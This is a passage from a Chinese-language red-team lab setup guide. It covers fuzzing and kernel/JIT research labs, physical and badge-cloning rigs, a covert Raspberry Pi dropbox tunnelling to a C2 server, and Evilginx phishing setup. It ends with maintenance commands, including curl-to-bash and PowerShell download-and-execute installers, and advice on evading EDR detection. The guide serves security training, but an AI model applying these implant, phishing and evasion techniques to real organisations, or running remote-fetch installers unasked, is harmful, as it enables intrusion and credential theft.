        size_t len = __AFL_FUZZ_TESTCASE_LEN;
        if (len < 4) continue;
        target_parser(buf, len);
    }

    return 0;
}
```

```bash
# 用 LLVM 模式与 AddressSanitizer（ASAN）编译
afl-clang-lto -O2 -fsanitize=address,undefined harness.c -o /mnt/ramdisk/harness

# 用最小合法输入播种语料
echo "INIT" > /mnt/ramdisk/in/seed1.bin

# 在绑定的 CPU 核上并行运行模糊测试：
# 主实例运行在核心 0：
taskset -c 0 afl-fuzz -M main -i /mnt/ramdisk/in -o /mnt/ramdisk/out -- /mnt/ramdisk/harness
# 从实例运行在核心 1：
taskset -c 1 afl-fuzz -S slave1 -i /mnt/ramdisk/in -o /mnt/ramdisk/out -- /mnt/ramdisk/harness
```

---

### 18.2 Syzkaller Linux 内核模糊测试实验环境

Syzkaller 是 Google 的覆盖率引导内核模糊测试器。它使用声明式的系统调用描述（`sys/`）以及插桩了 KCOV 与 KASAN 的 QEMU 虚拟机。

```bash
# 1. 安装前置依赖
sudo apt install -y make gcc flex bison libelf-dev libssl-dev qemu-system-x86

# 2. 构建带 KASAN、KCOV 与调试符号的 Linux 内核
git clone --depth 1 https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git ~/linux-syz
cd ~/linux-syz
make defconfig
make kvm_guest.config

# 在 .config 中启用所需的内核插桩选项：
scripts/config -e CONFIG_KCOV
scripts/config -e CONFIG_KASAN
scripts/config -e CONFIG_KASAN_INLINE
scripts/config -e CONFIG_CONFIGFS_FS
scripts/config -e CONFIG_SECURITYFS
scripts/config -e CONFIG_DEBUG_INFO_DWARF5
scripts/config -d CONFIG_RANDOMIZE_BASE

make -j$(nproc) bzImage

# 3. 用 Syzkaller 脚本创建最小 Debian 根文件系统镜像
mkdir -p ~/syzkaller-lab/image && cd ~/syzkaller-lab/image
git clone https://github.com/google/syzkaller.git ~/syzkaller
sudo ~/syzkaller/tools/create-image.sh -d bullseye

# 4. 构建 Syzkaller 可执行文件（需要 Go 1.22+）
cd ~/syzkaller
make
```

#### Syzkaller 管理器配置（`my.cfg`）

```json
{
    "target": "linux/amd64",
    "http": "127.0.0.1:56741",
    "workdir": "/home/user/syzkaller-lab/workdir",
    "kernel_obj": "/home/user/linux-syz",
    "image": "/home/user/syzkaller-lab/image/bullseye.img",
    "sshkey": "/home/user/syzkaller-lab/image/bullseye.id_rsa",
    "syzkaller": "/home/user/syzkaller",
    "procs": 8,
    "type": "qemu",
    "vm": {
        "count": 4,
        "kernel": "/home/user/linux-syz/arch/x86/boot/bzImage",
        "cpu": 2,
        "mem": 2048
    }
}
```

```bash
# 启动 Syzkaller 管理器
~/syzkaller/bin/syz-manager -config=my.cfg
# 用浏览器打开 http://127.0.0.1:56741，查看实时崩溃报告与覆盖率增长
```

---

### 18.3 浏览器引擎与 JIT 研究环境

浏览器漏洞利用的重点是优化 JIT 编译器（V8 TurboFan/Maglev、JavaScriptCore DFG/FTL）。研究需要启用内部调试选项来编译调试版 shell。

```bash
# 1. 安装 Google depot_tools
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git ~/depot_tools
export PATH="$HOME/depot_tools:$PATH"
echo 'export PATH="$HOME/depot_tools:$PATH"' >> ~/.bashrc

# 2. 获取并构建 V8 调试 shell（d8）
mkdir -p ~/v8-research && cd ~/v8-research
fetch v8
cd v8

# 构建带 AddressSanitizer 的 64 位调试版本
tools/dev/gm.py x64.debug.asan

# 3. 用 d8 测试 JIT 引擎内部行为
# 带上优化追踪选项运行：
./out/x64.debug.asan/d8 --allow-natives-syntax --trace-opt --trace-deopt test_poc.js
```

---

### 18.4 补丁差分与确定性调试工作站

在补丁大范围部署之前发现 1-day 漏洞，是理解真实世界利用原语最快的途径。

```bash
# 补丁差分工具
# 1. BinDiff 9（Google/Zynamics）：独立安装，并配置为 Ghidra/IDA 插件
# https://github.com/google/bindiff/releases

# 2. Diaphora：面向 Ghidra 与 IDA Pro 的开源差分插件
git clone https://github.com/joxeankoret/diaphora.git ~/diaphora

# 确定性录制与重放调试（rr）
# 把非确定性的竞态条件与堆破坏录制一次，即可无限次重放：
sudo apt install -y rr

# 为 rr 启用性能计数器：
sudo sh -c 'echo 1 > /proc/sys/kernel/perf_event_paranoid'

# 录制目标二进制的执行：
rr record /path/to/vulnerable_binary exploit_input.bin

# 在 GDB 下重放，支持完整的反向执行：
rr replay
# 在 GDB 中：
# (rr) reverse-continue  # 反向运行到内存分配处
# (rr) reverse-stepi     # 单条指令倒退回溯
# (rr) watch *0x7fffffffe000  # 设观察点并 reverse-continue，找出谁覆写了内存
```

---

## 19. 特种作战实验环境：物理、社会工程与量子（阶段 6）

阶段 6 的活动发生在物理空间、人际交互以及前沿密码学领域。实验环境也从虚拟机延伸到物理测试台、射频测试舱和硬件拦截装置。

---

### 19.1 物理红队与隐蔽进入工作台

一张专用的物理安全测试台，让你可以反复练习商用锁具、锁芯重排以及机械绕过工具，而不损坏任何财产。

```
物理测试台组件：
1. 锁具支架与固定座：
   - 2 个重型台面锁具安装支架（铝制或钢制）
   - 剖面练习锁（标准弹子锁、线轴弹子、锯齿弹子）
   - 商用插芯锁芯（Schlage SC1/SC4、Kwikset KW1、Yale 8 弹子）
   - 高安全锁芯（Medeco Biaxial、Mul-T-Lock Interactive、ASSA Abloy）

2. 钥匙压印工位：
   - 精密珠宝台式台钳，带橡胶钳口保护片
   - 瑞士式 4 号 pippin 锉刀
   - 10 倍带照明光学放大镜
   - 黄铜钥匙坯（SC1 100 个、KW1 100 个）

3. 门禁绕过测试架：
   - 独立式木门模拟夹具，门缝间隙可调（1/8 英寸到 1/2 英寸）
   - 装配商用把手（内侧）与钥匙孔（外侧）
   - 带死锁闩的弹簧锁舌，用于练习插片与推刀操作
   - 门底工具（UDT）练习用离地间隙（3/8 英寸内切）
```

```bash
# 实操锁芯重排练习
# 按递增难度重排锁芯：
# 第 1 级：3 个标准弹子
# 第 2 级：5 个标准弹子
# 第 3 级：4 个标准弹子 + 2 个线轴弹子（识别假定位）
# 第 4 级：2 个标准弹子 + 2 个线轴弹子 + 2 个锯齿弹子（反向旋转练习）
```

---

### 19.2 电子访问控制（EAC）测试架

电子访问控制系统主要运行两种协议：传统的 Wiegand 与现代的 OSDP（RS-485）。有了测试台，你就可以嗅探徽章流量、重放凭据，并审计控制器的失效安全状态。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/14._Electronic_Access_Control_(EAC)_Test_Rig.png" alt="Electronic Access Control (EAC) Test Rig" width="700"/>

</td></tr></table>
</div>

```bash
# 1. Proxmark3 RDV4 搭配 Iceman 固件的配置
sudo apt install -y p7zip git build-essential libreadline5 libreadline-dev libusb-0.1-4 libusb-dev libqt5core5a libqt5gui5 libqt5widgets5
git clone https://github.com/RfidResearchGroup/proxmark3.git ~/proxmark3
cd ~/proxmark3
make clean && make all
sudo make install

# 启动 Proxmark3 客户端：
proxmark3 /dev/ttyACM0

# Proxmark3 速查：
# [usb] pm3 --> lf search             # 自动识别低频（125kHz）徽章
# [usb] pm3 --> lf hid clone -w H10301 --fc 100 --cn 1337   # 克隆 HID Prox 卡
# [usb] pm3 --> hf search             # 自动识别高频（13.56MHz）徽章
# [usb] pm3 --> hf mf autopwn         # 破解 MIFARE Classic 密钥并导出存储内容

# 2. OSDP 协议审计
git clone https://github.com/ezforever/osdp-tool.git ~/osdp-tool
cd ~/osdp-tool && make
# 捕获并解析读卡器与控制器之间的原始 RS-485 OSDP 通信：
sudo ./osdp-tool -d /dev/ttyUSB1 -b 9600 -p
```

---

### 19.3 隐蔽硬件植入物与现场投递盒

现场作业需要无人值守的网络植入物：能承受断电、能建立加密的带外反向隧道，并在企业局域网内静默运行。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/15._Covert_Dropbox_Field_Implant_Architecture.png" alt="Covert Dropbox Field Implant Architecture" width="1400"/>

</td></tr></table>
</div>

```bash
# Raspberry Pi Zero 2W / CM4 隐蔽投递盒配置
# 1. 基础系统：以无头方式配置 Raspberry Pi OS Lite（64 位）
# 2. 安装 WireGuard，建立回连 VPS 的加密带外 C2
sudo apt install -y wireguard resolvconf

# 投递盒上的 /etc/wireguard/wg0.conf：
cat << 'EOF' | sudo tee /etc/wireguard/wg0.conf
[Interface]
PrivateKey = <DROPBOX_PRIVATE_KEY>
Address = 10.200.200.2/24
DNS = 1.1.1.1

[Peer]
PublicKey = <VPS_SERVER_PUBLIC_KEY>
Endpoint = c2.yourdomain.com:51820
AllowedIPs = 10.200.200.0/24
PersistentKeepalive = 25
EOF

sudo systemctl enable wg-quick@wg0

# 3. 自动化的链路联通侦察守护进程
# 一旦插入网线，就静默触发内网枚举：
cat << 'EOF' | sudo tee /usr/local/bin/on-link-up.sh
#!/bin/bash
INTERFACE="eth0"
LOG="/var/log/net-recon.log"

if ip link show $INTERFACE | grep -q "state UP"; then
    echo "[*] Link active on $INTERFACE at $(date)" >> $LOG
    # 被动监听网络 60 秒（零数据包注入）
    tcpdump -i $INTERFACE -c 100 -nn "arp or port 53 or port 67 or port 137" -w /tmp/passive.pcap &
fi
EOF
sudo chmod +x /usr/local/bin/on-link-up.sh
```

---

### 19.4 社会工程与电话布景实验环境

测试组织的人为因素，需要一套隔离的电话基础设施：可控的主叫号码设置，以及逼真的声学布景。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/16._Social_Engineering_&_Telephony_PBX_Staging.png" alt="Social Engineering & Telephony PBX Staging" width="1000"/>

</td></tr></table>
</div>

```bash
# 容器化 Asterisk PBX，用于可控的语音钓鱼演练
docker run -d --name asterisk-lab \
  -p 5060:5060/udp \
  -p 10000-10050:10000-10050/udp \
  andrius/asterisk

# 配置 SIP 软电话（Linphone 或 MicroSIP）连接到本地 Asterisk 实例
# 中转 VPS：部署 GoPhish + Evilginx3，并配置自动化的 SSL 证书
git clone https://github.com/kgretzky/evilginx2 ~/evilginx2
cd ~/evilginx2 && make
sudo ./bin/evilginx -p /path/to/phishlets
```

---

### 19.5 技术监视对抗（TSCM）测试舱

要懂得如何藏匿物理设备，必须先懂得防守方的扫描如何发现它们。搭建一个可控的射频与光学测试空间。

```
TSCM 实验设备清单：
1. 射频频谱分析：
   - RF Explorer 6G Combo（15MHz 到 6.1GHz 手持扫频工具）
   - HackRF One + PortaPack H2，运行 Mayhem 固件（瀑布图显示、捕获与重放）
   - 在装有 ALFA AWUS036ACH Wi-Fi 网卡的 Linux 笔记本上运行 Kismet

2. 非线性节点探测器（NLJD）目标测试：
   - 测试台配备未上电的硅 IC、已停用的微控制器与铜走线
   - 观察二次谐波回波（半导体特征）与三次谐波（腐蚀金属结点）的差异

3. 光学镜头与热成像检查：
   - SpyFinder PRO 或光学回反射 LED 频闪器
   - InfiRay P2 Pro 或 FLIR ONE 手机热成像相机（可发现墙体/插座中的热羽流）
```

```bash
# 射频频谱基线录制
# 在测试窃听植入物之前，扫描各频段以建立背景基线：
# 扫描 2.4 GHz ISM 频段：
hackrf_sweep -f 2400:2500 -w 1000000 > baseline_24ghz.csv

# 与干净基线对比，检查峰值与异常：
python3 -c "
import pandas as pd
data = pd.read_csv('baseline_24ghz.csv', header=None)
print('Strongest RF carriers detected in lab:')
print(data.sort_values(by=data.columns[-1], ascending=False).head(5))
"
```

---

### 19.6 量子与后量子密码（PQC）测试台

随着量子辅助密码分析日渐临近，攻击方正按“先存储、后解密”（SNDL）策略收集当下的加密流量。PQC 实验环境用于审计迁移过程中的薄弱点与密码降级攻击。

```bash
# 1. 为 OpenSSL 3.x 安装 Open Quantum Safe（liboqs）与 OQS-Provider
sudo apt update && sudo apt install -y cmake gcc ninja-build libssl-dev
git clone --depth 1 https://github.com/open-quantum-safe/liboqs.git ~/liboqs
cd ~/liboqs && mkdir build && cd build
cmake -GNinja -DCMAKE_INSTALL_PREFIX=/usr/local -DBUILD_SHARED_LIBS=ON ..
ninja && sudo ninja install

git clone --depth 1 https://github.com/open-quantum-safe/oqs-provider.git ~/oqs-provider
cd ~/oqs-provider && mkdir build && cd build
cmake -GNinja -DOPENSSL_ROOT_DIR=/usr -DCMAKE_INSTALL_PREFIX=/usr/local ..
ninja && sudo ninja install

# 2. 使用 ML-KEM-768 测试后量子 TLS 1.3 握手
openssl s_client -connect pq-test.target.com:443 -groups mlkem768:x25519_mlkem768

# 3. SNDL 流量捕获装置
# 配置持续的环形缓冲原始数据包捕获，写入加密 ZFS 池：
dumpcap -i eth0 -b filesize:1000000 -b files:50 -w /mnt/encrypted_storage/sndl_capture.pcapng
```

---

## 20. 快照纪律

快照就是你的版本控制。没有严格的快照纪律，一次失败的实验就可能毁掉数小时的工作。请把它当作不可妥协的规矩。

### 命名规范

```
格式：    [VM-NAME]_[PHASE]_[DATE]_[STATE]
示例：
  win11-kdbg_p3_2027-01-15_clean-baseline
  kali-attacker_p2_2027-01-20_after-goad-install
  flare-vm_p4a_2027-02-01_hevd-loaded
  goad-dc01_p4i_2027-02-10_post-kerberoast-test
  cape-sandbox_p4a_2027-03-05_before-malware-run
```

### 快照工作流

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/11._Snapshot_Workflow.png" alt="Snapshot Workflow" width="750"/>

</td></tr></table>
</div>

```bash
# VMware 命令行快照命令（适合放进脚本）
vmrun snapshot /path/to/vm.vmx "p3_2027-01-15_before-heap-exploit"
vmrun listSnapshots /path/to/vm.vmx
vmrun revertToSnapshot /path/to/vm.vmx "p3_2027-01-15_before-heap-exploit"
vmrun deleteSnapshot /path/to/vm.vmx "p3_2027-01-15_before-heap-exploit"

# VirtualBox 命令行
VBoxManage snapshot "VM-Name" take "p3_before-heap-exploit"
VBoxManage snapshot "VM-Name" list
VBoxManage snapshot "VM-Name" restore "p3_before-heap-exploit"

# Proxmox 命令行（在 Proxmox 宿主上运行）
qm snapshot <VMID> snap_name --description "p3 before heap exploit"
qm listsnapshot <VMID>
qm rollback <VMID> snap_name

# 规矩：做以下任何一件事之前先打快照：
# - 加载新驱动或内核模块
# - 运行未知恶意软件做分析
# - 修改 bcdedit（内核调试设置）
# - 执行 GOAD 置备或重新置备
# - 在实验虚拟机中安装大型工具
# - 开始新的 CTF 或挑战之前
```

### 快照的存储空间规划

```
虚拟机存储（精简置备）+ 快照会迅速膨胀。
各路线图层级的预估存储需求：

kali-attacker：   80 GB 基础盘 + 50 GB 快照 = 130 GB
ubuntu-dev：      100 GB 基础盘 + 60 GB 快照 = 160 GB
win11-target：    100 GB 基础盘 + 80 GB 快照 = 180 GB
GOAD (5 VMs)：    400 GB 基础盘 + 200 GB 快照 = 600 GB
flare-vm：        150 GB 基础盘 + 100 GB 快照 = 250 GB
remnux：          60 GB 基础盘 + 20 GB 快照 = 80 GB
cape-sandbox：    100 GB 基础盘 + 50 GB 快照 = 150 GB
detectionlab：    200 GB 基础盘 + 100 GB 快照 = 300 GB
kernel debug VMs：100 GB 基础盘 + 100 GB 快照 = 200 GB
--
Tier 2/3 合计：   2.05 TB（阶段 0 到阶段 4）
建议：            4 TB SSD 专用于虚拟机存储

阶段 5 与 6 GREATEST 增补：
syzkaller-host：  200 GB 基础盘 + 100 GB 工作目录 = 300 GB
v8-research：     150 GB 基础盘 + 80 GB 构建日志 = 230 GB
AFL++ RAMdisks：  16-32 GB tmpfs + 100 GB 语料存档 = 132 GB
SNDL PCAP 池：    500 GB 到 1 TB 加密环形缓冲（ZFS 池）
TSCM 射频扫描：   50 GB 频谱扫描基线
--
Tier 4 合计：     ~3.5 TB NVMe 主盘 + 4 到 8 TB 二级存档池
建议：            4 TB NVMe Gen4/Gen5 主盘 + 8 TB 存储池（Tier 4 GREATEST）
```

---

## 21. 逐阶段实验环境演进

只建当前阶段需要的部分。完整实验环境是逐步搭起来的。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/12._Phase-by-Phase_Lab_Evolution.png" alt="Lab Build Progression" width="1400"/>

</td></tr></table>
</div>

### 阶段检查清单

```
阶段 -1（作战安全）：从这里开始
  [ ] Whonix Gateway 虚拟机已部署
  [ ] Whonix Workstation 虚拟机已部署
  [ ] Tor 连通性已验证：curl --socks5 localhost:9050 https://check.torproject.org
  [ ] 宿主已配置 VPN（推荐 Mullvad：无日志、支持端口转发）

阶段 0（基础）：核心实验环境
  [ ] Kali 2024.x 虚拟机已部署：4 vCPU、8 GB 内存、80 GB 存储
  [ ] Ubuntu 22.04 LTS 开发机已部署：4 vCPU、8 GB 内存、100 GB 存储
  [ ] 实验内网（VMnet2 / vmbr1）已配置：10.10.10.0/24
  [ ] 两台虚拟机都在内网上并已分配静态 IP
  [ ] Kali 同时接入 NAT 以访问互联网
  [ ] 阶段 0 的全部软件包已装在 Ubuntu 开发机上（用验证脚本核对）
  [ ] GDB + GEF 可用：gdb -batch -ex "gef version"
  [ ] pwntools 可用：python3 -c "import pwn; print(pwn.__version__)"
  [ ] Ghidra 可用：启动无报错
  [ ] 两台虚拟机都已创建 "clean-baseline" 快照

阶段 1（Web）：加入 Windows 目标机
  [ ] Windows 11 23H2 虚拟机已部署：4 vCPU、8 GB 内存、100 GB 存储
  [ ] 位于实验内网（10.10.10.30）
  [ ] Visual Studio 2022 已安装，含 C++ 工作负载
  [ ] x64dbg 已安装且可用
  [ ] Sysinternals 套件已安装
  [ ] Kali 上已安装 Burp Suite 社区版
  [ ] Win11 虚拟机已创建 "clean-baseline" 快照

阶段 2（网络 + AD）：Active Directory 实验环境
  [ ] GOAD 已部署（或用层级 1 硬件手工搭 2 虚拟机 AD 实验环境）
  [ ] GOAD：5 台虚拟机全部运行，且 Kali 可访问
  [ ] Kali 上 BloodHound + Neo4j 可用：sudo neo4j start && bloodhound
  [ ] SharpHound 采集成功：.zip 能无报错导入 BloodHound
  [ ] AD 实验网（VMnet3 / vmbr2）已配置：10.20.20.0/24
  [ ] Kali 可通过 AD 网卡访问所有域控制器
  [ ] NetExec（nxc）可用：nxc smb 10.20.20.0/24
  [ ] 所有 GOAD 虚拟机都已创建 "clean-baseline" 快照

阶段 3（利用）：恶意软件分析 + 内核调试
  [ ] FLARE-VM 已部署并配置完成（安装后已断开互联网）
  [ ] FLARE-VM 工具已核验：x64dbg、Ghidra、PE-bear、Detect-It-Easy
  [ ] REMnux 已部署并更新
  [ ] REMnux 工具已核验：volatility3 --info、remnux --version
  [ ] CAPE 沙箱已部署且可用（提交样本能返回报告）
  [ ] Linux 内核调试环境：QEMU 能启动调试内核，GDB 可在 :1234 连接
  [ ] Windows 内核调试：WinDbg 已通过 KD 网络连上 win11-kdbg
  [ ] 调试机与目标机都已安装 VirtualKD-Redux
  [ ] WinDbg 符号已解析：执行 .reload /f 后，lm 显示 ntoskrnl 已带符号
  [ ] HEVD 驱动可在 win11-kdbg 虚拟机上加载
  [ ] DetectionLab 已部署（硬件允许时）：Splunk 可在 :8000 访问
  [ ] 阶段 3 的所有虚拟机都已创建 "clean-baseline" 快照

阶段 4（进阶）：完整实验环境
  [ ] ICS/SCADA 实验环境：OpenPLC 可访问，Modbus 扫描能返回结果
  [ ] 容器实验环境：k3s 集群可用，kubectl get nodes 返回 ready
  [ ] 硬件实验环境：Flipper Zero 固件已更新，UART 适配器已测试
  [ ] 所有实验虚拟机都有最新快照
  [ ] 硬件：为 hashcat 备好 GPU（若为层级 2 及以上）
  [ ] 存储：至少 2 TB 空闲空间用于虚拟机扩容

阶段 5（GREATEST）：漏洞研究、模糊测试与 0-Day 实验环境
  [ ] 内存盘已配置并挂载（/mnt/ramdisk）
  [ ] AFL++ 已安装，并带 LLVM LTO 支持编译
  [ ] CPU 调频策略设为 performance；core dump 已配置
  [ ] 持久化模式测试夹具能编译，且运行速度 >10,000 exec/秒
  [ ] Syzkaller 已安装；已编译自定义的 KASAN/KCOV Linux 内核
  [ ] Syzkaller 的 QEMU 测试实例能启动，并通过 SSH 密钥连接
  [ ] V8 调试 shell（d8）已带 ASAN 与优化追踪编译
  [ ] BinDiff 9 与 Diaphora 已安装，并针对目标 DLL 测试过
  [ ] rr（Mozilla 录制与重放）可用；反向调试已验证
  [ ] 阶段 5 所有模糊测试与研究虚拟机都已创建 "clean-baseline" 快照

阶段 6（特种作战）：物理红队、社会工程、TSCM 与量子实验环境
  [ ] 物理开锁台已搭好：练习锁芯、重排套件、开锁工具组
  [ ] 门禁绕过夹具已用门底工具（UDT）与推刀测试过
  [ ] 电子访问控制测试架已装配：12V 电源、控制器、读卡器、电磁锁
  [ ] Proxmark3 RDV4 固件已更新（Iceman 版本）；lf/hf search 可用
  [ ] Flipper Zero 已更新到最新固件；RFID/sub-GHz 重放已测试
  [ ] ESPKey / Wiegand 嗅探器已组装，并在读卡器线路上测试过
  [ ] Raspberry Pi 隐蔽投递盒已配置可自动重连的 WireGuard
  [ ] Asterisk PBX / 软电话环境可支撑语音钓鱼话术演练
  [ ] RF Explorer / HackRF One 频谱扫描基线已录制
  [ ] 光学回反射与热成像相机已针对隐藏目标验证
  [ ] liboqs 与 oqs-provider 已随 OpenSSL 3.x 编译；ML-KEM 握手已测试
```

---

## 22. 环境验证清单

在完整部署实验环境后，从 Kali 运行以下内容，核验各系统均可访问且功能正常。

```bash
#!/usr/bin/env bash
# 实验环境连通性与工具验证脚本
# 从 Kali 攻击机运行

echo "======================================================"
echo "  BlackHAT Lab Verification Script"
echo "  Run from: Kali Attacker VM"
echo "======================================================"

# --- 网络连通性 ---
echo ""
echo "[*] Internal Lab Network: 10.10.10.0/24"
for host in 10.10.10.20 10.10.10.30 10.10.10.40 10.10.10.60; do
    ping -c1 -W2 $host > /dev/null 2>&1 && echo "[OK] $host reachable" || echo "[FAIL] $host unreachable"
done

echo ""
echo "[*] AD Lab Network: 10.20.20.0/24 (GOAD)"
for host in 10.20.20.10 10.20.20.11 10.20.20.12; do
    ping -c1 -W2 $host > /dev/null 2>&1 && echo "[OK] $host reachable" || echo "[FAIL] $host unreachable"
done

# --- 工具验证 ---
echo ""
echo "[*] Core Tools"
tools=("nmap" "netexec" "bloodhound" "impacket-secretsdump" "certipy" "evil-winrm" "ligolo-proxy" "sliver" "afl-fuzz" "qemu-system-x86_64" "gdb" "r2" "tshark" "dumpcap")
for tool in "${tools[@]}"; do
    which $tool > /dev/null 2>&1 && echo "[OK] $tool" || echo "[FAIL] $tool not found"
done

echo ""
echo "[*] Python Tools"
python3 -c "import pwn" 2>/dev/null && echo "[OK] pwntools" || echo "[FAIL] pwntools"
python3 -c "import impacket" 2>/dev/null && echo "[OK] impacket" || echo "[FAIL] impacket"
python3 -c "import scapy" 2>/dev/null && echo "[OK] scapy" || echo "[FAIL] scapy"
python3 -c "import certipy" 2>/dev/null && echo "[OK] certipy-ad" || echo "[FAIL] certipy-ad"

echo ""
echo "[*] GOAD AD Lab (SMB check)"
nxc smb 10.20.20.10-12 2>/dev/null | grep -E "SMB|FAILED" | head -5

echo ""
echo "[*] BloodHound / Neo4j"
systemctl is-active neo4j > /dev/null 2>&1 && echo "[OK] neo4j running" || echo "[WARN] neo4j not running: sudo neo4j start"

echo ""
echo "[*] Docker (Container Lab)"
docker ps > /dev/null 2>&1 && echo "[OK] docker daemon running" || echo "[FAIL] docker daemon not running"

echo ""
echo "[*] Internet Access (via NAT)"
curl -s --max-time 5 https://1.1.1.1 > /dev/null && echo "[OK] internet reachable" || echo "[FAIL] no internet"

echo ""
echo "======================================================"
echo "  Verification complete."
echo "======================================================"
```

---

## 23. 维护计划

实验环境不维护就会退化。工具会过时，签名库能抓到老手法，Windows 评估许可证也会过期。

### 每周

```bash
# 更新 Kali
sudo apt update && sudo apt full-upgrade -y

# 更新 Go 工具
go install github.com/OJ/gobuster/v3@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 更新 Python 工具
pip3 install --upgrade netexec certipy-ad bloodhound impacket --break-system-packages

# 更新 Sliver C2
curl https://sliver.sh/install | sudo bash

# 阶段 5：清理并去重模糊测试语料
afl-cmin -i /mnt/ramdisk/out/main/queue -o /mnt/ramdisk/minimized_corpus -- /mnt/ramdisk/harness
```

### 每月

```bash
# 更新 GOAD（拉取新的错误配置与置备脚本）
cd ~/GOAD && git pull && pip3 install -r requirements.txt --break-system-packages

# 更新 REMnux
remnux upgrade

# 更新 FLARE-VM（在 Windows 虚拟机上以管理员身份运行 PowerShell）
# iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1'))

# 更新 BloodHound（有新版本发布时）
# https://github.com/SpecterOps/BloodHound/releases

# 阶段 5：拉取最新 V8 源码并重新构建调试版本
cd ~/v8-research/v8 && git pull && gclient sync && tools/dev/gm.py x64.debug.asan

# 阶段 6：更新 Proxmark3 RDV4 仓库，必要时重刷固件
cd ~/proxmark3 && git pull && make clean && make all

# 更新完成后，为所有稳定运行的虚拟机打快照
# 命名：[VM-NAME]_maintenance_[DATE]_post-update

# 检查 Windows 评估许可证到期情况：
# 在 Windows 虚拟机上：slmgr /dlv（显示剩余天数）
# 若不足 30 天：下载新的评估版 ISO 重建（或用 slmgr /rearm 延长一次）
```

### 当某个工具被签名规则拦截时

```
症状：Defender/EDR 拦下了上周还能用的工具。
应对：
1. 绝不要把样本提交到 VirusTotal 或任何公开沙箱（会暴露你的作业手法）。
2. 用 DetectionLab 的 Splunk 确认究竟触发了哪条检测。
3. 改造手法：用不同的字符串从源码重新编译，
   改变系统调用方式，换成等价的 LOLBIN，或干脆自己重写一套。
4. 先在 DetectionLab 中复测，再拿去打加固过的目标。
5. 记录：什么被抓到、触发了哪条检测规则、什么做法躲过去了。
   这些记录就是你个人的作业手法开发日志。
```

---

<div align="right">

*BlackHAT 实验环境搭建指南 —— The BlackHAT Roadmap v1.2.2（0 到 GREATEST）的一部分*<br/>
*作者：Sagar Biswas（[@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT)）· 规范仓库：https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap*<br/>
*精选生态：[Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)*<br/>
*依据 Creative Commons Attribution-ShareAlike 4.0 International（CC BY-SA 4.0）许可发布*<br/>
*状态：活文档。实验环境随你的成长而扩展。*

</div>

---